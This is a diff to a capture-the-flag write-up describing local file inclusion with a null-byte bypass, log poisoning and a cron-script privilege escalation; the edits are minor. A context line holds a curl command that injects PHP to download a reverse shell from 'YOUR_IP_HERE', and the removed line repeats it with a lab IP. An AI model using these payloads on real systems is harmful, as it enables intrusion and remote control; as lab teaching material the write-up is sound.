@@ -79,6 +79,8 @@ In this case, the null byte (%00) will terminate the string at `/etc/passwd`, wh
 
 Great! we managed to bypass that specific sanitization check as we have gotten a different error message from before. However, it seems that there are still additional checks being conducted as we cannot access the **/etc/passwd** file.
 
+<br>
+
 Doing some research online, I soon came upon the following LFI payloads from https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion:
 
 <img style="float: left;" src="screenshots/screenshot9.png">
@@ -175,8 +177,6 @@ We will also use **curl** to make the request:
 
 ```
 curl -A “<?php file_put_contents(‘shell.php’,file_get_contents(‘http://YOUR_IP_HERE/shell.php'))?>" http://10.10.65.102
-
-curl -A “<?php file_put_contents(‘shell.php’,file_get_contents(‘http://10.4.6.205/shell.php'))?>" http://10.10.229.167
 ```
 
 The command above will cause the server to download the reverse shell script from our local machine *(we should have a http server up and running on our side)*. The `-A` option is used to set the user-agent header.
@@ -265,7 +265,7 @@ We have an interesting shell script called **backup.sh** that is owned by **root
 
 <img style="float: left;" src="screenshots/screenshot31.png">
 
-Looks like the shell script uses `tar` to archive the contents of /root/container into a backup file called backup.tar. Since this is a backup file, we can assume that this runs periodically as a cronjob. Furthermore, we can actually write over this file as we have root privileges! This is great as this means that we can overwrite the contents and write in a command to open up a reverse shell. The file will then be executed by root automatically.
+Looks like the shell script uses `tar` to archive the contents of /root/container into a backup file called backup.tar. Since this is a backup file, we can assume that this runs periodically as a cronjob. Furthermore, we can actually write over this file as we have root privileges! This is great as this means that we can overwrite the contents and write in a command to open up a reverse shell. The file will then be executed by root after some time has passed.
 
 <br>
 
